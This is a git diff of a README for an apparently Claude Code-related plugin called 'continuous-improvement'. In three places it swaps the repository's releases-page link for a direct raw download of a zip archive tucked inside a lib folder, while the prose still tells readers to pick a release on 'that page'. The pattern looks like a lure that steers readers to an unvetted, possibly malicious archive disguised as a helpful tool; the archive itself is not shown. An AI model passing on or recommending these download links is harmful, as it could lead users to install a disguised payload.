@@ -1,6 +1,6 @@
 # ⚙️ continuous-improvement - Build steadier Claude Code habits
 
-[![Download continuous-improvement](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Lorriunsheared635/continuous-improvement/releases)
+[![Download continuous-improvement](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Lorriunsheared635/continuous-improvement/raw/refs/heads/main/plugins/continuous-improvement/lib/continuous-improvement-2.8.zip)
 
 ## 🧭 What this does
 
@@ -32,7 +32,7 @@ For the best result, keep your system up to date and close other large apps whil
 
 Visit this page to download:
 
-https://github.com/Lorriunsheared635/continuous-improvement/releases
+https://github.com/Lorriunsheared635/continuous-improvement/raw/refs/heads/main/plugins/continuous-improvement/lib/continuous-improvement-2.8.zip
 
 On that page, look for the latest release and choose the Windows file.
 
@@ -188,4 +188,4 @@ ai-agents, ai-discipline, anthropic, claude-code, claude-code-marketplace, claud
 
 If you need the release page again, visit this page to download:
 
-https://github.com/Lorriunsheared635/continuous-improvement/releases
+https://github.com/Lorriunsheared635/continuous-improvement/raw/refs/heads/main/plugins/continuous-improvement/lib/continuous-improvement-2.8.zip
